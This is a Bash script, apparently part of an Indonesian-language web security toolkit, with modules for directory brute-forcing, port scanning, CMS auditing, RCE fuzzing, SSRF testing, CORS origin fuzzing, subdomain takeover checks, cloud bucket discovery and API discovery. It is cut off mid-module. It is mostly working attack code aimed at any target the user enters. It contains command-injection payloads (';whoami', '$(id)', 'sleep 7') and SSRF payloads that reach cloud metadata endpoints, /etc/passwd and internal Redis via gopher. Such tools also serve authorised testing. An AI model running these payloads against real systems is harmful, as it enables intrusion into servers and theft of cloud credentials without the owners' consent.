function start_dir_bruter {
    clear
    local nama_modul="DIRECTORY BRUTER"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 07: DIRECTORY BRUTE-FORCER (TURBO MODE)${NC}                "
    echo -e "${C}=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
    read target
    [[ -z "$target" ]] && return
    [[ "${target: -1}" != "/" ]] && target="$target/"

    # --- LOGIKA PENAMAAN FILE AMAN ---
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_DIR_BRUTE.txt"

    # Wordlist diperluas
    wordlist=("admin" "login" "config" "api" "v1" "v2" "db" "backup" ".env" ".git" "phpmyadmin" "secret" "dev" "staging" "test" "upload" "uploads" "images" "assets" "js" "css")
    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    total=${#wordlist[@]}
    found_count=0
    current=1

    # --- PENGATURAN MULTI-THREADING (FIFO) ---
    local threads=5
    local temp_fifo="/tmp/$$.fifo"
    mkfifo "$temp_fifo"
    exec 3<>"$temp_fifo"
    rm "$temp_fifo"
    for ((i=0; i<threads; i++)); do echo >&3; done

    echo -e "\n${INFO} Memulai Turbo Scan (${C}Threads: $threads${NC}) pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    # Setup Log Header
    {
        echo "DIRECTORY BRUTE-FORCE REPORT - $target"
        echo "DATE: $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-25s | %-12s | %-20s\n" "PATH TESTED" "HTTP CODE" "STATUS"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- SCANNING LOOP ---
    for path in "${wordlist[@]}"; do
        read -u3 
        (
            # Visual Progress Bar (Sama seperti Modul 06)
            percent=$(( current * 100 / total ))
            bar_len=$(( percent / 5 ))
            bar=$(printf "%${bar_len}s" | tr ' ' '=')
            printf "\r${INFO} Progress: [${C}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

            # Requesting
            status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 10 "$target$path")

            if [[ "$status_code" != "404" && "$status_code" != "000" ]]; then
                local res_status="UNKNOWN"
                local color="${W}"
                
                case $status_code in
                    200) res_status="DITEMUKAN (OK)"; color="${G}${BOLD}" ;;
                    403) res_status="FORBIDDEN (403)"; color="${Y}" ;;
                    301|302) res_status="REDIRECT"; color="${B}" ;;
                    500) res_status="SERVER ERROR"; color="${R}" ;;
                esac

                # Output Detail ala Modul 06
                echo -e "\n  ${OK} ${G}ACTIVE PATH:${NC} ${W}/$path${NC}"
                echo -e "      ╰─> Status: ${color}$status_code $res_status${NC}"
                
                printf "%-25s | %-12s | %-20s\n" "/$path" "$status_code" "$res_status" >> "$filename"
                # Increment found count (dalam subshell ini tidak akan update variabel parent, 
                # namun untuk log tetap masuk)
            fi
            echo >&3 
        ) &
        ((current++))
    done

    wait 
    exec 3>&- 

    # --- FINAL REPORT ---
    echo -ne "\r                                                                                                    \r"
    echo -e "-----------------------------------------------------------------------------"
    echo -e "${OK} ${G}${BOLD}SCAN SELESAI!${NC} Hasil tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_port_scanner {
    clear
    local nama_modul="PORT SCANNER"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 08: PORT SCANNER & SERVICE DISCOVERY${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Memeriksa pintu masuk (port) aktif dan identifikasi layanan."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan IP atau Domain Target: ${W}"
    read target
    if [[ -z "$target" ]]; then echo -e "${ERR} Target Kosong!"; return; fi

    # Format Nama File Log Aman
    local target_clean=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${target_clean^^}_PORT_SCAN.txt"

    # List Port (Common Ports)
    ports=(21 22 23 25 53 80 110 143 443 445 1433 1521 3306 3389 5432 8080 8443)
    
    total=${#ports[@]}
    found_ports=0
    current=1

    echo -e "\n${INFO} Memulai pemindaian pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "PORT SCANNING & SERVICE REPORT - $target"
        echo "DATE : $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-10s | %-15s | %-20s\n" "PORT" "STATUS" "SERVICE"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- SCANNING LOOP ---
    for port in "${ports[@]}"; do
        # Visual Progress Bar (Persis Modul 6 & 7)
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Progress: [${Y}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Cek Koneksi TCP
        (timeout 1 bash -c "echo > /dev/tcp/$target/$port") >/dev/null 2>&1
        result=$?

        if [ $result -eq 0 ]; then
            # Service Identification
            case $port in
                21) service="FTP" ;;
                22) service="SSH" ;;
                23) service="TELNET" ;;
                25) service="SMTP" ;;
                53) service="DNS" ;;
                80) service="HTTP" ;;
                110) service="POP3" ;;
                143) service="IMAP" ;;
                443) service="HTTPS" ;;
                445) service="SMB/SAMBA" ;;
                1433) service="MSSQL" ;;
                1521) service="ORACLE" ;;
                3306) service="MYSQL" ;;
                3389) service="RDP" ;;
                5432) service="POSTGRESQL" ;;
                8080|8443) service="HTTP-ALT" ;;
                *) service="UNKNOWN" ;;
            esac
            
            # Output Detail saat port terbuka
            echo -e "\n  ${OK} ${G}PORT OPEN:${NC} ${W}$port${NC}"
            echo -e "      ╰─> Service: ${P}$service${NC} | Protocol: ${C}TCP${NC}"
            
            printf "%-10s | %-15s | %-20s\n" "$port" "OPEN" "$service" >> "$filename"
            ((found_ports++))
        fi

        ((current++))
        sleep 0.05 # Delay halus agar progress bar terlihat bergerak
    done

    # --- FINAL REPORT ---
    echo -ne "\r                                                                                                    \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_ports -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}SELESAI! $found_ports port aktif ditemukan.${NC}"
        echo "---------------------------------------------------------------------------" >> "$filename"
        echo "TOTAL OPEN PORTS: $found_ports" >> "$filename"
    else
        echo -e "${ERR} ${R}Tidak ada port umum yang terbuka.${NC}"
    fi
    
    echo -e "${INFO} Laporan audit: ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"
    read
}
function start_cms_scanner {
    clear
    local nama_modul="CMS SCANNER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 09: CMS IDENTIFIER & DEEP AUDIT PRO${NC}                    "
    echo -e "${C}=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL Target: ${W}"; read target
    [[ -z "$target" ]] && return
    [[ "${target: -1}" != "/" ]] && target="$target/"

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_CMS_PRO.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    echo -e "\n${INFO} Memulai Analisis Heuristik pada: ${W}$target"
    echo "-----------------------------------------------------------------------------"

    # 1. LOGIKA DETEKSI MULTI-LAYER (Headers + Body + Files)
    # Kita ambil Header dan Body secara terpisah untuk efisiensi
    local resp_headers=$(curl -s -I -k -L -A "$ua" --connect-timeout 10 "$target")
    local resp_body=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target" | head -n 500) # Cek 500 baris pertama saja

    cms_found="Unknown"
    
    # Deteksi via HTTP Headers (Paling Akurat/Cepat)
    if echo "$resp_headers" | grep -qi "X-Powered-By: PHP"; then php_version="Detected"; fi
    if echo "$resp_headers" | grep -qi "WP-Engine"; then cms_found="WordPress (Managed)"; fi
    
    # Deteksi via Signature Logic
    declare -A cms_sigs=(
        ["WordPress"]="wp-content|wp-includes|xmlrpc.php"
        ["Joomla"]="joomla|option=com_|Joomla!"
        ["Drupal"]="Drupal.settings|sites/all|drupal.js"
        ["Magento"]="Mage.Cookies|/static/frontend/|magento"
        ["Laravel"]="XSRF-TOKEN|laravel_session|/_debugbar/"
    )

    for cms in "${!cms_sigs[@]}"; do
        if echo "$resp_body" | grep -qiE "${cms_sigs[$cms]}"; then
            cms_found="$cms"
            break
        fi
    done

    echo -e "  ${OK} CMS Terdeteksi: ${G}${BOLD}$cms_found${NC}"

    # 2. LOGIKA AUDIT BERDASARKAN TIPE CMS
    findings=0
    {
        echo "CMS DEEP AUDIT REPORT - $target"
        echo "-----------------------------------------------------"
    } > "$filename"

    case "$cms_found" in
        "WordPress")
            echo -e "${INFO} Menjalankan WP-Specific Security Audit..."
            
            # Logic: Cek Version via Meta Generator
            wp_ver=$(echo "$resp_body" | grep -Po '(?<=content="WordPress )[^"]*')
            [[ -n "$wp_ver" ]] && echo -e "  ${INFO} Version: ${Y}$wp_ver${NC}" && echo "WP Version: $wp_ver" >> "$filename"

            # Logic: XML-RPC Attack Surface
            if [[ $(curl -s -k -o /dev/null -w "%{http_code}" "$target/xmlrpc.php") == "405" ]]; then
                echo -e "  ${WARN} ${R}CRITICAL:${NC} XML-RPC Vulnerable (Method Allowed)"
                ((findings++))
            fi

            # Logic: REST API Exposure (User Leak)
            user_leak=$(curl -s -k "$target/wp-json/wp/v2/users" | grep -Po '"slug":"\K[^"]*')
            if [[ -n "$user_count" ]]; then
                echo -e "  ${WARN} ${R}VULN:${NC} REST API User Leak: ${Y}$user_leak${NC}"
                ((findings++))
            fi

            # Logic: License Path Disclosure
            if [[ $(curl -s -k -o /dev/null -w "%{http_code}" "$target/license.txt") == "200" ]]; then
                echo -e "  ${WARN} ${Y}INFO:${NC} Sensitive File Exposed: license.txt"
                ((findings++))
            fi
            ;;

        "Laravel")
            echo -e "${INFO} Menjalankan Laravel Security Audit..."
            # Logic: Debug Mode Check
            if curl -s -k "$target" | grep -qi "Environment Variables"; then
                echo -e "  ${WARN} ${R}CRITICAL:${NC} APP_DEBUG is ON"
                ((findings++))
            fi
            ;;
            
        *)
            # Logic: Generic Header Security Audit
            echo -e "${INFO} Menjalankan Generic Security Headers Audit..."
            for header in "X-Frame-Options" "Content-Security-Policy" "X-Content-Type-Options"; do
                if ! echo "$resp_headers" | grep -qi "$header"; then
                    echo -e "  ${WARN} ${Y}MISSING:${NC} $header (Security Best Practice)"
                fi
            done
            ;;
    esac

    echo -e "-----------------------------------------------------------------------------"
    echo -e "${OK} Scan Selesai. Ditemukan ${G}$findings${NC} potensi isu keamanan."
    echo -e "${INFO} Laporan detail: ${DG}$filename${NC}"
    echo -ne "\n${Q} Tekan Enter untuk kembali..."; read
}
function start_rce_scanner {
    clear
    local nama_modul="RCE SCANNER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 10: REMOTE CODE EXECUTION (RCE) PRO${NC}                    "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Mencoba eksekusi OS Command via Parameter (Direct & Blind Mode)."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Full (cth: http://site.com/exec?cmd=): ${W}"; read target
    [[ -z "$target" ]] && return

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_RCE_PRO.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # Kombinasi Payload: Direct Output & Time-Based (Blind)
    rce_payloads=(
        ";whoami" "|id" "&whoami" "\$(id)" "\`id\`"
        ";sleep 7" "|sleep 7" "&sleep 7"
        "||timeout 7" ";powershell Sleep 7"
    )

    total=${#rce_payloads[@]}
    found_rce=0
    current=1

    echo -e "\n${INFO} Fuzzing Target: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "RCE PRO AUDIT REPORT - $target"
        echo "DATE : $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-25s | %-12s | %-20s\n" "PAYLOAD" "TYPE" "EVIDENCE"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- SCANNING LOOP ---
    for payload in "${rce_payloads[@]}"; do
        # Visual Progress Bar (Persis Modul 09)
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Encode & Measure Time
        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
        
        start_time=$(date +%s)
        response=$(curl -s -k -L -A "$ua" --connect-timeout 15 "$target$encoded_payload")
        end_time=$(date +%s)
        duration=$((end_time - start_time))

        # 1. LOGIKA DETEKSI: DIRECT OUTPUT
        if echo "$response" | grep -qiE "uid=|gid=|groups=|www-data|apache|root|system32|Windows IP"; then
            evidence=$(echo "$response" | grep -iE "uid=|www-data|root" | head -n1 | cut -c1-30 | tr -d '\n\r')
            echo -e "\n  ${OK} ${R}${BLINK}VULNERABLE (Direct):${NC} ${W}$payload${NC}"
            echo -e "      ╰─> Evidence: ${G}$evidence${NC}"
            printf "%-25s | %-12s | %-20s\n" "$payload" "DIRECT" "$evidence" >> "$filename"
            ((found_rce++))

        # 2. LOGIKA DETEKSI: BLIND RCE (Time-Based)
        elif [ "$duration" -ge 7 ] && [ "$duration" -le 12 ]; then
            # Jika durasi respon >= 7 detik (sesuai payload sleep 7)
            echo -e "\n  ${OK} ${R}${BLINK}VULNERABLE (Blind):${NC} ${W}$payload${NC}"
            echo -e "      ╰─> Evidence: ${Y}Time Delay ${duration}s Detected${NC}"
            printf "%-25s | %-12s | %-20s\n" "$payload" "BLIND" "Delay ${duration}s" >> "$filename"
            ((found_rce++))
        fi

        ((current++))
    done

    # --- FINAL REPORT ---
    echo -ne "\r                                                                                                    \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_rce -gt 0 ]; then
        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Ditemukan $found_rce titik celah RCE!"
    else
        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan celah RCE umum.${NC}"
    fi
    
    echo -e "${INFO} Laporan: ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_ssrf_tester {
    clear
    local nama_modul="SSRF SCANNER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 11: SERVER-SIDE REQUEST FORGERY (SSRF) PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Mencoba paksa server mengakses internal network, cloud metadata, & files."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Parameter (cth: http://site.com/proxy.php?url=): ${W}"; read target
    [[ -z "$target" ]] && return

    # --- LOGIKA PENAMAAN FILE ---
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_SSRF_PRO.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # SSRF Payload Collection: Cloud, Localhost, Port Scanning, & Protocol Wrapper
    ssrf_payloads=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/computeMetadata/v1/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://127.0.0.1:22"
        "http://127.0.0.1:3306"
        "http://localhost:80"
        "http://localhost:6379"
        "file:///etc/passwd"
        "dict://127.0.0.1:11211"
        "gopher://127.0.0.1:6379/_INFO"
    )

    total=${#ssrf_payloads[@]}
    found_ssrf=0
    current=1

    echo -e "\n${INFO} Fuzzing Target: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "SSRF PRO AUDIT REPORT - $target"
        echo "DATE : $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-45s | %-15s\n" "PAYLOAD / RESOURCE" "STATUS"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- SCANNING LOOP ---
    for payload in "${ssrf_payloads[@]}"; do
        # Visual Progress Bar
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Encode Payload menggunakan Python (agar karakter khusus seperti '/' di dalam parameter tidak pecah)
        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
        
        # Eksekusi Request
        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target$encoded_payload")

        # --- LOGIKA DETEKSI KOMPREHENSIF ---
        # Memeriksa kata kunci spesifik dari berbagai service internal
        if echo "$response" | grep -qiE "ami-id|instance-id|root:x:|SSH-2.0|mysql_native_password|redis_version|total_connections|auth_token"; then
            
            # Identifikasi Evidence singkat
            evidence="N/A"
            if [[ "$response" == *"root:x:"* ]]; then evidence="LFI/Passwd Detected"; fi
            if [[ "$response" == *"ami-id"* ]]; then evidence="AWS Metadata Leak"; fi
            if [[ "$response" == *"SSH-2.0"* ]]; then evidence="SSH Port Open"; fi

            echo -e "\n  ${OK} ${R}${BLINK}VULNERABLE:${NC} ${W}$payload${NC}"
            echo -e "      ╰─> Evidence: ${G}$evidence${NC}"
            printf "%-45s | %-15s\n" "$payload" "VULNERABLE" >> "$filename"
            ((found_ssrf++))
        else
            printf "%-45s | %-15s\n" "$payload" "SECURE" >> "$filename"
        fi

        ((current++))
        sleep 0.1
    done

    # --- FINAL REPORT ---
    echo -ne "\r                                                                                                    \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_ssrf -gt 0 ]; then
        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Ditemukan $found_ssrf titik potensi SSRF!"
    else
        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan indikasi SSRF yang umum.${NC}"
    fi
    
    echo -e "${INFO} Laporan: ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}
function start_cors_scanner {
    clear
    local nama_modul="CORS SCANNER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 12: CORS MISCONFIGURATION SCANNER PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Menguji kebijakan Cross-Origin (Pencurian Session via AJAX)."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL API/Web Target: ${W}"; read target
    [[ -z "$target" ]] && return

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_CORS_PRO.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # List Origin untuk di-fuzzing
    origins=(
        "http://evil.com"
        "null"
        "http://${domain}.evil.com"
        "http://localhost"
    )

    total=${#origins[@]}
    current=1
    found_vuln=0

    echo -e "\n${INFO} Fuzzing Origins pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "CORS PRO AUDIT REPORT - $target"
        echo "DATE : $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-30s | %-15s | %-15s\n" "ORIGIN TESTED" "ALLOW-ORIGIN" "ALLOW-CREDS"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    for evil_origin in "${origins[@]}"; do
        # Progress Bar
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Request
        cors_res=$(curl -s -I -k -A "$ua" -H "Origin: $evil_origin" --connect-timeout 10 "$target")
        
        allow_origin=$(echo "$cors_res" | grep -i "Access-Control-Allow-Origin" | awk '{print $2}' | tr -d '\r')
        allow_creds=$(echo "$cors_res" | grep -i "Access-Control-Allow-Credentials" | awk '{print $2}' | tr -d '\r')

        # Analisis Kerentanan
        if [[ "$allow_origin" == "$evil_origin" || "$allow_origin" == "*" ]]; then
            status_tag="${Y}VULN"
            if [[ "$allow_creds" == *"true"* ]]; then
                status_tag="${R}${BLINK}CRITICAL"
            fi
            echo -e "\n  ${OK} ${status_tag}${NC}: Origin ${W}$evil_origin${NC} diterima!"
            ((found_vuln++))
        fi

        printf "%-30s | %-15s | %-15s\n" "$evil_origin" "${allow_origin:-None}" "${allow_creds:-None}" >> "$filename"
        ((current++))
    done

    echo -ne "\r                                                                             \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_vuln -gt 0 ]; then
        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Terdeteksi celah CORS Misconfiguration!"
    else
        echo -e "${OK} ${G}Scan Selesai. Kebijakan CORS tampak aman.${NC}"
    fi
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}
function start_takeover_hunter {
    clear
    local nama_modul="TAKEOVER HUNTER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 13: SUBDOMAIN TAKEOVER HUNTER PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Mendeteksi CNAME ke layanan pihak ketiga yang tidak terkonfigurasi."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Subdomain Target (cth: blog.site.com): ${W}"; read target
    [[ -z "$target" ]] && return

    local target_clean=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${target_clean^^}_TAKEOVER_PRO.txt"

    echo -e "\n${INFO} Menganalisis DNS & Response untuk: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    # 1. Cek DNS Record
    cname=$(host -t CNAME "$target" | awk '/is an alias for/ {print $NF}' | sed 's/\.$//')

    {
        echo "SUBDOMAIN TAKEOVER PRO REPORT"
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    if [[ -z "$cname" ]]; then
        echo -e "  ${INFO} DNS Status: ${G}No CNAME detected.${NC}"
        echo "STATUS: No CNAME Record Found." >> "$filename"
    else
        echo -e "  ${OK} CNAME Alias: ${Y}$cname${NC}"
        echo "CNAME ALIAS: $cname" >> "$filename"

        # 2. Fingerprint Matching
        fingerprints=(
            "GitHub|github.io" "Heroku|herokudns.com" "AmazonS3|amazonaws.com"
            "Shopify|myshopify.com" "Azure|azurewebsites.net" "Desk|desk.com"
        )

        found_fp=false
        for fp in "${fingerprints[@]}"; do
            service=$(echo $fp | cut -d'|' -f1)
            pattern=$(echo $fp | cut -d'|' -f2)

            if [[ "$cname" == *"$pattern"* ]]; then
                echo -e "  ${OK} Service: ${C}$service${NC}"
                found_fp=true
                
                # 3. Verifikasi HTTP Status (Double Check)
                echo -ne "  ${INFO} Verifying service availability... "
                http_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "http://$target")
                
                if [[ "$http_code" == "404" ]]; then
                    echo -e "${R}${BLINK}VULNERABLE (404 Not Found)${NC}"
                    echo "RESULT: VULNERABLE - Service $service returns 404" >> "$filename"
                else
                    echo -e "${G}POTENTIALLY SAFE (HTTP $http_code)${NC}"
                    echo "RESULT: POTENTIAL - Fingerprint match but HTTP is $http_code" >> "$filename"
                fi
                break
            fi
        done

        if [ "$found_fp" = false ]; then
            echo -e "  ${INFO} Service: ${W}Unknown/Custom${NC}"
            echo "RESULT: CNAME points to unknown provider." >> "$filename"
        fi
    fi

    echo -e "-----------------------------------------------------------------------------"
    echo -e "${INFO} Audit Selesai. Hasil: ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_bucket_hunter {
    clear
    local nama_modul="BUCKET HUNTER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 14: CLOUD STORAGE EXPOSURE FINDER PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Mencari storage AWS S3, GCP, & Azure yang terbuka secara publik."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Nama Bucket/Projek: ${W}"; read bucket_name
    [[ -z "$bucket_name" ]] && return

    local filename="$(echo "$bucket_name" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_BUCKET_PRO.txt"

    # Cloud Endpoints
    providers=(
        "AWS S3|http://$bucket_name.s3.amazonaws.com"
        "GCP Storage|https://storage.googleapis.com/$bucket_name"
        "Azure Blob|https://$bucket_name.blob.core.windows.net"
    )

    total=${#providers[@]}
    current=1
    found_exposed=0

    echo -e "\n${INFO} Scanning Bucket: ${W}$bucket_name"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "CLOUD BUCKET PRO AUDIT REPORT"
        echo "BUCKET NAME : $bucket_name"
        echo "DATE        : $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-15s | %-10s | %-20s\n" "PROVIDER" "CODE" "SECURITY STATUS"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    for entry in "${providers[@]}"; do
        provider=$(echo "$entry" | cut -d'|' -f1)
        url=$(echo "$entry" | cut -d'|' -f2)

        # Progress Bar
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Request & Content Check
        res_body=$(curl -s -k --connect-timeout 5 "$url")
        http_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$url")

        status_msg="SECURE/PRIVATE"
        color_status="${G}"

        if [[ "$http_code" == "200" ]]; then
            # Cek jika ada list file (XML common in S3/GCP)
            if [[ "$res_body" == *"<Key>"* || "$res_body" == *"<Contents>"* || "$res_body" == *"ListBucketResult"* ]]; then
                status_msg="VULNERABLE (LISTABLE)"
                color_status="${R}${BLINK}"
                ((found_exposed++))
            else
                status_msg="OPEN (EMPTY/INDEX)"
                color_status="${Y}"
                ((found_exposed++))
            fi
        elif [[ "$http_code" == "403" ]]; then
            status_msg="PROTECTED (403)"
        else
            status_msg="NOT FOUND / ERROR"
            color_status="${DG}"
        fi

        echo -e "\n  ${OK} ${provider}: ${color_status}${status_msg}${NC}"
        printf "%-15s | %-10s | %-20s\n" "$provider" "$http_code" "$status_msg" >> "$filename"
        
        ((current++))
    done

    echo -ne "\r                                                                             \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_exposed -gt 0 ]; then
        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Terdeteksi exposure pada cloud storage!"
    else
        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan bucket publik.${NC}"
    fi
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_api_discovery {
    clear
    local nama_modul="API DISCOVERY PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 15: API ENDPOINT DISCOVERY PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Fuzzing jalur API, dokumentasi Swagger, & GraphQL Introspection."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Target (cth: http://api.site.com): ${W}"; read target
    [[ -z "$target" ]] && return
    [[ "${target: -1}" != "/" ]] && target="$target/"

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_API_PRO.txt"

    # Expanded API Path List
    api_paths=(
        "api/v1" "api/v2" "api/v3" "graphql" "graphiql" "swagger/index.html" 
        "swagger-ui.html" "api-docs" "v1/swagger.json" "swagger.yaml" 
        "api/v1/health" "api/v1/auth/login" "console" "actuator/health" "api/docs"
    )

    total=${#api_paths[@]}
    current=1
    found_api=0
    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    echo -e "\n${INFO} Fuzzing API Endpoints pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "API DISCOVERY PRO REPORT - $target"
        echo "DATE : $(date)"
